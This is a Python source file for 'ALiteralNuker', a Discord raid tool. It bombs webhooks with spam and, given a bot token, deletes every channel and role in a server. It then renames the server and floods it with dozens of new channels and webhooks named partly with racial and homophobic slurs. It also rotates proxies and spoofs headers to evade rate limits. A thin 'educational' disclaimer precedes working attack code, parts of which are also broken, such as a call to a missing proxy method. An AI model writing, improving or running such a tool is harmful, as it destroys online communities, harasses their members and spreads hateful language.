# ====== IMPORTS ======
import requests
import discord
import asyncio
import os
import json
import random
import logging
import time
import uuid
import string
import base64
from typing import List, Dict, Optional
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.panel import Panel
from rich.table import Table
from rich import print as rprint
from discord.ext import commands
from colorama import Fore, Style, init
from rich.layout import Layout
from rich.spinner import Spinner
from rich.text import Text
from rich.box import Box, ROUNDED
import aiohttp

# Initialize colorama and Rich console
init(autoreset=True)
console = Console()

# ====== CONFIGURATION ======
class Config:
    """Configuration settings for the nuker"""
    def __init__(self):
        self.max_concurrent_requests = 5  # Maximum number of concurrent requests
        self.retry_attempts = 3           # Number of retry attempts for failed requests
        self.retry_delay = 1              # Delay between retries in seconds
        self.message_delay = 0.1          # Delay between messages in seconds
        self.batch_size = 10              # Number of messages to send in a batch
        self.connection_pool_size = 10    # Size of the connection pool

# ====== PERFORMANCE METRICS ======
class PerformanceMetrics:
    """Tracks performance metrics for the nuker"""
    def __init__(self):
        self.start_time = time.time()
        self.messages_sent = 0
        self.attachments_sent = 0
        self.failed_requests = 0
        self.total_requests = 0
        self.rate_limits_hit = 0

    def get_stats(self) -> Dict:
        """Calculate and return current performance statistics"""
        elapsed_time = time.time() - self.start_time
        return {
            "messages_per_second": self.messages_sent / elapsed_time if elapsed_time > 0 else 0,
            "success_rate": ((self.total_requests - self.failed_requests) / self.total_requests * 100) if self.total_requests > 0 else 0,
            "rate_limits_hit": self.rate_limits_hit,
            "total_messages": self.messages_sent,
            "total_attachments": self.attachments_sent,
            "elapsed_time": elapsed_time
        }

# ====== CONNECTION POOL ======
class ConnectionPool:
    """Manages a pool of HTTP connections for better performance"""
    def __init__(self, pool_size: int):
        self.pool_size = pool_size
        self.sessions = []
        self.current = 0

    async def get_session(self):
        """Get the next available session from the pool"""
        if not self.sessions:
            for _ in range(self.pool_size):
                self.sessions.append(requests.Session())
        session = self.sessions[self.current]
        self.current = (self.current + 1) % self.pool_size
        return session

# ====== RETRY HANDLER ======
class RetryHandler:
    """Handles retries for failed operations with exponential backoff"""
    def __init__(self, max_retries: int, base_delay: float):
        self.max_retries = max_retries
        self.base_delay = base_delay

    async def execute_with_retry(self, func, *args, **kwargs):
        """Execute a function with retry logic"""
        for attempt in range(self.max_retries):
            try:
                return await func(*args, **kwargs)
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise e
                delay = self.base_delay * (2 ** attempt)  # Exponential backoff
                await asyncio.sleep(delay)

# Initialize global objects
config = Config()
metrics = PerformanceMetrics()
connection_pool = ConnectionPool(config.connection_pool_size)
retry_handler = RetryHandler(config.retry_attempts, config.retry_delay)

# ====== DISCLAIMER ======
def disclaimer():
    """Display the disclaimer message"""
    print(Fore.RED + "==============================================")
    print(Fore.RED + "⚠️  WARNING: This script is for EDUCATIONAL and TESTING PURPOSES ONLY.")
    print(Fore.RED + "⚠️  DO NOT run this on servers you don't own or have permission to attack.")
    print(Fore.RED + "⚠️  The creators (LiterallySnowy and SkitDev) are NOT responsible for any damage caused.")
    print(Fore.RED + "==============================================")
    input(Fore.YELLOW + "Press ENTER to continue if you're not a total idiot...")

# Display disclaimer
disclaimer()

# ====== LOGGING SETUP ======
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ====== FILE PATHS ======
base_folder = "ALiteralNuker"
attachments_folder = os.path.join(base_folder, "attachments")
assets_folder = os.path.join(base_folder, "assets")
webhook_file = os.path.join(base_folder, "deleted_webhooks.json")
icon_path = os.path.join(assets_folder, "icon.jpg")

# Create necessary directories
os.makedirs(base_folder, exist_ok=True)
os.makedirs(attachments_folder, exist_ok=True)
os.makedirs(assets_folder, exist_ok=True)

# Initialize webhook file if it doesn't exist
if not os.path.exists(webhook_file):
    with open(webhook_file, "w") as f:
        json.dump([], f)

# ====== WEBHOOK MANAGEMENT ======
def load_deleted_webhooks():
    """Load the list of deleted webhooks from file"""
    try:
        if not os.path.exists(webhook_file):
            with open(webhook_file, "w") as f:
                json.dump([], f)
            return []
            
        with open(webhook_file, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                # If file is corrupted, reset it
                with open(webhook_file, "w") as f:
                    json.dump([], f)
                return []
    except Exception as e:
        logging.error(f"Error loading deleted webhooks: {e}")
        return []

def save_deleted_webhook(webhook_url):
    """Save a deleted webhook URL to the file"""
    try:
        deleted_webhooks = load_deleted_webhooks()
        if webhook_url not in deleted_webhooks:
            deleted_webhooks.append(webhook_url)
            with open(webhook_file, "w") as f:
                json.dump(deleted_webhooks, f)
    except Exception as e:
        logging.error(f"Error saving deleted webhook: {e}")

# ====== UTILITY FUNCTIONS ======
def clear_screen():
    """Clear the console screen"""
    os.system("cls" if os.name == "nt" else "clear")

def main_menu():
    """Display the main menu and get user choice"""
    clear_screen()
    console.print(Panel.fit(
        "[cyan]██╗     ███╗   ██╗\n"
        "██║     ████╗  ██║\n"
        "██║     ██╔██╗ ██║\n"
        "██║     ██║╚██╗██║\n"
        "███████╗██║ ╚████║\n"
        "╚══════╝╚═╝  ╚═══╝",
        title="ALiteralNuker",
        border_style="red"
    ))
    
    console.print("[red]🔥 ALiteralNuker - Made by LiterallySnowy 🔥")
    
    table = Table(show_header=True, header_style="bold yellow", box=ROUNDED)
    table.add_column("Option", style="cyan", justify="center")
    table.add_column("Description", style="green")
    
    table.add_row("1", "Webhook Bomber")
    table.add_row("2", "Bot Server Bomber")
    table.add_row("3", "Channel Spammer")
    
    console.print(table)
    return console.input("[cyan]Choose mode (1, 2, or 3): ")

def confirm_action(action):
    """Ask for confirmation before performing a destructive action"""
    confirmation = input(Fore.RED + f"Are you sure you want to {action}? (y/n): ").lower()
    return confirmation == 'y'

def parse_list_input(input_str: str) -> List[str]:
    """Parse a comma-separated string into a list"""
    return [item.strip() for item in input_str.split(",")]

# ====== RATE LIMIT HANDLING ======
async def handle_rate_limit(response):
    """Handle Discord rate limit responses"""
    if response.status_code == 429:
        metrics.rate_limits_hit += 1
        retry_after = response.json().get('retry_after', 1)
        logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
        await asyncio.sleep(retry_after / 1000)
        return True
    return False

# ====== RATE LIMIT BYPASS ======
class RateLimitBypass:
    """Handles rate limit bypassing using proxies and other techniques"""
    def __init__(self):
        self.proxy_list = []
        self.channel_proxies = []  # Proxies for channel creation
        self.spam_proxies = []     # Proxies for spamming
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
        ]
        self.session_ids = set()
        self.load_proxies()
        if not self.proxy_list:
            raise Exception("No proxies found in proxies.txt! Please add proxies to continue.")

    def load_proxies(self):
        """Load and validate proxies from proxies.txt"""
        try:
            with open("proxies.txt", "r") as f:
                proxy_lines = [line.strip() for line in f if line.strip()]
                
            for proxy in proxy_lines:
                if ":" in proxy:
                    if "@" in proxy:  # Format: username:password@ip:port
                        auth, address = proxy.split("@")
                        username, password = auth.split(":")
                        ip, port = address.split(":")
                        self.proxy_list.append({
                            "http": f"http://{username}:{password}@{ip}:{port}",
                            "https": f"http://{username}:{password}@{ip}:{port}",
                            "original": proxy
                        })
                    else:  # Format: ip:port
                        ip, port = proxy.split(":")
                        self.proxy_list.append({
                            "http": f"http://{ip}:{port}",
                            "https": f"http://{ip}:{port}",
                            "original": proxy
                        })
                elif proxy.startswith(("http://", "https://")):  # Full URL format
                    self.proxy_list.append({
                        "http": proxy,
                        "https": proxy,
                        "original": proxy
                    })
            
            # Split proxies between channel creation and spamming
            random.shuffle(self.proxy_list)
            split_point = len(self.proxy_list) // 2
            self.channel_proxies = self.proxy_list[:split_point]
            self.spam_proxies = self.proxy_list[split_point:]
            
            console.print(f"[yellow]Loaded {len(self.proxy_list)} proxies")
            console.print(f"[green]Channel creation proxies: {len(self.channel_proxies)}")
            console.print(f"[green]Spam proxies: {len(self.spam_proxies)}")
            
            self.test_proxies()
            
        except FileNotFoundError:
            raise Exception("proxies.txt not found! Please create it with your proxies.")

    async def test_single_proxy(self, proxy: Dict[str, str]) -> tuple[Dict[str, str], bool]:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy["http"],
                    timeout=aiohttp.ClientTimeout(total=5),  # Reduced timeout to 5 seconds
                    ssl=False
                ) as response:
                    if response.status == 200:
                        return proxy, True
                    return proxy, False
        except:
            return proxy, False

    def test_proxies(self):
        working_proxies = []
        failed_proxies = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Testing proxies...", total=len(self.proxy_list))
            
            # Create tasks for concurrent testing
            async def test_all_proxies():
                tasks = []
                for proxy in self.proxy_list:
                    tasks.append(self.test_single_proxy(proxy))
                return await asyncio.gather(*tasks)
            
            # Run concurrent tests
            results = asyncio.run(test_all_proxies())
            
            # Process results
            for proxy, is_working in results:
                if is_working:
                    working_proxies.append(proxy)
                    console.print(f"[green]Working proxy: {proxy['original']}")
                else:
                    failed_proxies.append(proxy)
                    console.print(f"[red]Failed proxy: {proxy['original']}")
                progress.update(task, advance=1)
        
        # Update proxies.txt with only working proxies
        try:
            with open("proxies.txt", "w") as f:
                for proxy in working_proxies:
                    f.write(f"{proxy['original']}\n")
            
            console.print(f"[green]Successfully removed {len(failed_proxies)} non-working proxies!")
            console.print(f"[green]Kept {len(working_proxies)} working proxies in proxies.txt")
            
            if len(working_proxies) == 0:
                raise Exception("No working proxies found! Please add working proxies to proxies.txt")
                
        except Exception as e:
            console.print(f"[red]Error updating proxies.txt: {e}")
            raise Exception("Failed to update proxies.txt with working proxies")
        
        self.proxy_list = working_proxies

    def get_channel_proxy(self) -> Dict[str, str]:
        """Get a random proxy for channel creation"""
        if not self.channel_proxies:
            raise Exception("No channel creation proxies available!")
        return random.choice(self.channel_proxies)

    def get_spam_proxy(self) -> Dict[str, str]:
        """Get a random proxy for spamming"""
        if not self.spam_proxies:
            raise Exception("No spam proxies available!")
        return random.choice(self.spam_proxies)

    def get_random_user_agent(self) -> str:
        """Get a random user agent string"""
        return random.choice(self.user_agents)

    def generate_session_id(self) -> str:
        """Generate a unique session ID"""
        session_id = str(uuid.uuid4())
        self.session_ids.add(session_id)
        return session_id

    def get_random_headers(self) -> Dict[str, str]:
        """Generate random headers for requests"""
        return {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-Super-Properties": base64.b64encode(json.dumps({
                "os": "Windows",
                "browser": "Chrome",
                "device": "",
                "system_locale": "en-US",
                "browser_user_agent": self.get_random_user_agent(),
                "browser_version": "91.0.4472.124",
                "os_version": "10",
                "referrer": "",
                "referring_domain": "",
                "referrer_current": "",
                "referring_domain_current": "",
                "release_channel": "stable",
                "client_build_number": 123456,
                "client_event_source": None
            }).encode()).decode(),
            "X-Discord-Locale": "en-US",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Timezone": "America/New_York",
            "X-Session-Id": self.generate_session_id()
        }

    async def create_webhook_with_retry(self, channel, max_retries=3):
        for attempt in range(max_retries):
            try:
                proxy = self.get_channel_proxy()
                webhook = await channel.create_webhook(
                    name="NUKED BY https://github.com/SkitDev/ALiteralNukerReborn",
                    reason="Nuked with ALiteralNuker"
                )
                return webhook
            except discord.HTTPException as e:
                if e.status == 429:  # Rate limit
                    retry_after = e.retry_after
                    console.print(f"[red]⚠️ Discord is trying to stop us! Waiting {retry_after:.2f}s before continuing the raid...")
                    await asyncio.sleep(retry_after)
                    continue
                raise e
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                await asyncio.sleep(1)
        return None

    async def spam_with_webhook(self, webhook_url: str, messages: str, repeat: int, attach_spam: str):
        message_list = parse_list_input(messages)
        attachment_list = []

        if attach_spam == "y":
            files = os.listdir(attachments_folder)
            if files:
                attachment_list = [os.path.join(attachments_folder, random.choice(files)) for _ in range(repeat)]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task_id = progress.add_task("[cyan]Sending messages...", total=repeat)
            
            for i in range(repeat):
                try:
                    message = random.choice(message_list)
                    attachment = random.choice(attachment_list) if attachment_list else None
                    # Use spam proxy for message sending
                    proxy = self.get_spam_proxy()
                    
                    success = await send_message_with_proxy(webhook_url, message, proxy, attachment)
                    if success:
                        progress.update(task_id, advance=1)
                        metrics.messages_sent += 1
                    
                    # Add small delay between messages to avoid rate limits
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    logging.error(f"Failed to send message: {e}")
                    continue

    async def send_message_with_retry(self, channel, message: str, proxy: Dict[str, str], attachment: Optional[str] = None, max_retries=3):
        for attempt in range(max_retries):
            try:
                # Add watermark to message
                watermarked_message = f"{message}\n\nNuked with https://github.com/SkitDev/ALiteralNukerReborn"
                
                if attachment and os.path.exists(attachment):
                    with open(attachment, 'rb') as f:
                        await channel.send(
                            content=watermarked_message,
                            file=discord.File(f)
                        )
                else:
                    await channel.send(
                        content=watermarked_message
                    )
                return True
            except discord.HTTPException as e:
                if e.status == 429:  # Rate limit
                    retry_after = e.retry_after
                    console.print(f"[red]⚠️ Discord is trying to slow us down! Waiting {retry_after:.2f}s before continuing the raid...")
                    await asyncio.sleep(retry_after)
                    continue
                raise e
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                await asyncio.sleep(1)
        return False

    async def spam_channel(self, channel, messages: str, repeat: int, attach_spam: str, progress, task_id):
        message_list = parse_list_input(messages)
        attachment_list = []
        
        if attach_spam == "y":
            files = os.listdir(attachments_folder)
            if files:
                attachment_list = [os.path.join(attachments_folder, random.choice(files)) for _ in range(repeat)]
        
        for i in range(repeat):
            try:
                message = random.choice(message_list)
                attachment = random.choice(attachment_list) if attachment_list else None
                proxy = self.get_spam_proxy()
                
                success = await self.send_message_with_retry(channel, message, proxy, attachment)
                if success:
                    progress.update(task_id, advance=1)
                    metrics.messages_sent += 1
                
                # Add small delay between messages to avoid rate limits
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logging.error(f"Failed to send message in channel {channel.name}: {e}")
                continue

# Initialize rate limit bypass
rate_limit_bypass = RateLimitBypass()

# ====== CHANNEL OPERATIONS ======
async def create_channel_with_proxy(guild, channel_name: str, proxy: Dict[str, str]) -> Optional[discord.TextChannel]:
    """Create a channel using a proxy"""
    try:
        session = requests.Session()
        session.proxies = proxy
        session.headers = rate_limit_bypass.get_random_headers()
        
        # Create channel using proxy
        channel = await guild.create_text_channel(channel_name)
        return channel
    except discord.HTTPException as e:
        if e.status == 429:  # Rate limit
            retry_after = e.retry_after
            console.print(f"[red]⚠️ Discord is trying to block us! Waiting {retry_after:.2f}s before continuing the raid...")
            await asyncio.sleep(retry_after)
        else:
            logging.error(f"Failed to create channel with proxy: {e}")
        return None
    except Exception as e:
        logging.error(f"Failed to create channel with proxy: {e}")
        return None

# ====== MESSAGE OPERATIONS ======
async def send_message_with_proxy(webhook_url: str, message: str, proxy: Dict[str, str], attachment: Optional[str] = None) -> bool:
    """Send a message using a proxy"""
    try:
        session = requests.Session()
        session.proxies = proxy
        session.headers = rate_limit_bypass.get_random_headers()
        
        # Add watermark to message
        watermarked_message = f"{message}\n\nNuked with https://github.com/SkitDev/ALiteralNukerReborn"
        payload = {"content": watermarked_message}
        
        if attachment:
            with open(attachment, "rb") as file:
                response = session.post(
                    webhook_url,
                    json=payload,
                    files={"file": file},
                    timeout=10
                )
        else:
            response = session.post(
                webhook_url,
                json=payload,
                timeout=10
            )
        
        if response.status_code == 429:
            return False
        
        return True
    except Exception as e:
        logging.error(f"Failed to send message with proxy: {e}")
        return False

async def spam_webhook(webhook_url: str, messages: str, repeat: int, attach_spam: str):
    message_list = parse_list_input(messages)
    attachment_list = []
    
    if attach_spam == "y":
        files = os.listdir(attachments_folder)
        if files:
            attachment_list = [os.path.join(attachments_folder, random.choice(files)) for _ in range(repeat)]
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console
    ) as progress:
        task_id = progress.add_task("[cyan]Sending messages...", total=repeat)
        
        # Create tasks for each message with different proxies
        tasks = []
        for i in range(repeat):
            message = random.choice(message_list)
            attachment = random.choice(attachment_list) if attachment_list else None
            proxy = rate_limit_bypass.get_next_proxy()
            
            task = asyncio.create_task(
                send_message_with_proxy(webhook_url, message, proxy, attachment)
            )
            tasks.append(task)
        
        # Wait for all tasks to complete
        results = await asyncio.gather(*tasks)
        
        # Update progress
        success_count = sum(1 for r in results if r)
        progress.update(task_id, completed=success_count)
        
        # Display stats
        stats = metrics.get_stats()
        console.print(Panel(
            f"[green]Messages sent: {success_count}/{repeat}\n"
            f"Success rate: {(success_count/repeat*100):.1f}%\n"
            f"Total messages: {stats['total_messages']}\n"
            f"Total attachments: {stats['total_attachments']}\n"
            f"Elapsed time: {stats['elapsed_time']:.1f}s",
            title="Performance Metrics"
        ))

# ====== MAIN LOOP ======
while True:
    choice = main_menu()

    # --- Webhook Bomber ---
    if choice == "1":
        webhook_url = console.input("[cyan]Enter the webhook URL: ")

        if webhook_url in load_deleted_webhooks():
            console.print("[red]❌ This webhook was already deleted! ❌")
            console.input("[yellow]Press Enter to return to the menu...")
            continue

        if not confirm_action("bomb this webhook"):
            continue

        messages = console.input("[cyan]Enter the spam messages (comma-separated): ")
        attach_spam = console.input("[cyan]Do you want to spam attachments? (y/n): ").lower()
        repeat = int(console.input("[cyan]How many times to spam?: "))

        asyncio.run(spam_webhook(webhook_url, messages, repeat, attach_spam))

        console.input("[yellow]Press Enter to return to the menu...")

    # --- Bot Server Bomber ---
    elif choice == "2":
        bot_token = console.input("[cyan]Enter bot token: ")
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            console.print(f"[green]🔥 Logged in as {bot.user} 🔥")

            guild_id = int(console.input("[cyan]Enter Server ID to nuke: "))
            guild = bot.get_guild(guild_id)

            if not guild:
                console.print("[red]❌ Bot is not in the server!")
                return

            if not confirm_action("nuke this server"):
                return

            messages = console.input("[cyan]Enter the spam messages (comma-separated): ")
            attach_spam = console.input("[cyan]Do you want to spam attachments? (y/n): ").lower()
            repeat = 50  # Fixed to 50 messages per channel
            channel_names = parse_list_input(console.input("[cyan]Enter channel names (comma-separated): "))

            async def delete_channel(channel):
                try:
                    await channel.delete()
                    console.print(f"[red]Deleted channel: {channel.name}")
                except Exception as e:
                    logging.error(f"Failed to delete channel {channel.name}: {e}")

            async def delete_role(role):
                try:
                    await role.delete()
                    console.print(f"[red]Deleted role: {role.name}")
                except Exception as e:
                    logging.error(f"Failed to delete role {role.name}: {e}")

            async def create_and_spam_channel(channel_name, proxy, category=None):
                try:
                    channel = await guild.create_text_channel(channel_name, category=category)
                    console.print(f"[green]Created channel: {channel_name} in category: {category.name if category else 'None'}")
                    
                    # Create webhooks and start spamming
                    webhook_tasks = []
                    for _ in range(5):
                        webhook = await rate_limit_bypass.create_webhook_with_retry(channel)
                        if webhook:
                            webhook_tasks.append(rate_limit_bypass.spam_with_webhook(webhook.url, messages, repeat, attach_spam))
                    
                    return channel, webhook_tasks
                except Exception as e:
                    logging.error(f"Failed to create/spam channel {channel_name}: {e}")
                    return None, []

            async def create_category_with_channels(category_name, num_channels, proxy):
                try:
                    # Create category with random position
                    category = await guild.create_category(
                        name=category_name,
                        position=random.randint(0, 100)
                    )
                    console.print(f"[green]Created category: {category_name}")

                    # Create channels in this category
                    channel_tasks = []
                    for _ in range(num_channels):
                        channel_name = random.choice(channel_names)
                        channel_tasks.append(create_and_spam_channel(channel_name, proxy, category))
                    
                    return category, channel_tasks
                except Exception as e:
                    logging.error(f"Failed to create category {category_name}: {e}")
                    return None, []

            # Start all operations concurrently
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                console=console
            ) as progress:
                # Create tasks for all operations
                delete_channel_tasks = [delete_channel(channel) for channel in guild.channels]
                delete_role_tasks = [delete_role(role) for role in guild.roles if role.name != "@everyone"]
                
                # Start server modifications
                server_mod_tasks = []
                try:
                    server_mod_tasks.append(guild.edit(name="Nuked by ALiteralNuker"))
                    icon_path = os.path.join(assets_folder, "icon.jpg")
                    if os.path.exists(icon_path):
                        with open(icon_path, "rb") as icon:
                            icon_bytes = icon.read()
                            server_mod_tasks.append(guild.edit(icon=icon_bytes))
                except Exception as e:
                    logging.error(f"Failed to modify server: {e}")

                # Wait for initial cleanup
                await asyncio.gather(*delete_channel_tasks, *delete_role_tasks, *server_mod_tasks)
                console.print("[green]Initial cleanup completed!")

                # Create categories and channels
                category_task = progress.add_task("[cyan]Creating categories and channels...", total=50)  # Create 50 categories
                
                # Generate random category names
                category_names = [
                    "NUKED", "RAIDED", "DESTROYED", "DELETED", "GONE", "BYE", "RIP",
                    "FUCKED", "SHIT", "ASS", "DICK", "PUSSY", "CUNT", "BITCH",
                    "NIGGER", "FAGGOT", "RETARD", "IDIOT", "STUPID", "DUMB",
                    "WASTE", "TRASH", "GARBAGE", "JUNK", "CRAP", "SHITTY",
                    "FUCKING", "SHITTING", "DESTROYING", "DELETING", "REMOVING",
                    "KILLING", "ENDING", "FINISHING", "COMPLETING", "DONE",
                    "OVER", "FINISHED", "COMPLETED", "ENDED", "KILLED",
                    "DEAD", "DIED", "GONE", "LOST", "MISSING", "ABSENT",
                    "AWAY", "GONE", "LEFT", "DEPARTED"
                ]

                category_tasks = []
                for _ in range(50):  # Create 50 categories
                    category_name = random.choice(category_names)
                    proxy = rate_limit_bypass.get_channel_proxy()
                    # Create 5-10 channels per category
                    num_channels = random.randint(5, 10)
                    category_tasks.append(create_category_with_channels(category_name, num_channels, proxy))
                
                # Process all categories and their channel tasks
                results = await asyncio.gather(*category_tasks)
                webhook_tasks = []
                for category, channel_tasks in results:
                    if category:
                        # Process channel tasks for this category
                        channel_results = await asyncio.gather(*channel_tasks)
                        for _, tasks in channel_results:
                            if tasks:
                                webhook_tasks.extend(tasks)
                
                # Start all webhook spam tasks
                if webhook_tasks:
                    await asyncio.gather(*webhook_tasks)
                
                progress.update(category_task, completed=50)
                console.print("[green]Nuke operation completed!")

        bot.run(bot_token)

    # --- Channel Spammer ---
    elif choice == "3":
        bot_token = console.input("[cyan]Enter bot token: ")
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            console.print(f"[green]🔥 Logged in as {bot.user} 🔥")

            guild_id = int(console.input("[cyan]Enter Server ID to spam channels: "))
            guild = bot.get_guild(guild_id)

            if not guild:
                console.print("[red]❌ Bot is not in the server!")
                return

            if not confirm_action("spam channels in this server"):
                return

            channel_names = parse_list_input(console.input("[cyan]Enter channel names (comma-separated): "))
            num_channels = int(console.input("[cyan]Enter the number of channels to create: "))
            messages = console.input("[cyan]Enter the spam messages (comma-separated): ")
            attach_spam = console.input("[cyan]Do you want to spam attachments? (y/n): ").lower()
            repeat = int(console.input("[cyan]How many times to spam?: "))

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Creating channels...", total=num_channels)
                
                for _ in range(num_channels):
                    try:
                        channel_name = random.choice(channel_names)
                        spam_channel = await guild.create_text_channel(channel_name)
                        console.print(f"[green]Created channel: {channel_name}")
                        
                        # Create webhooks in the spam channel
                        for _ in range(5):
                            webhook = await spam_channel.create_webhook(name="NUKED BY https://github.com/SkitDev/ALiteralNukerReborn")
                            asyncio.create_task(spam_webhook(webhook.url, messages, repeat, attach_spam))
                        
                        progress.update(task, advance=1)
                    except Exception as e:
                        logging.error(f"Failed to create spam channel or webhook: {e}")

        bot.run(bot_token)

    else:
        console.print("[red]❌ Invalid option! Try again.")
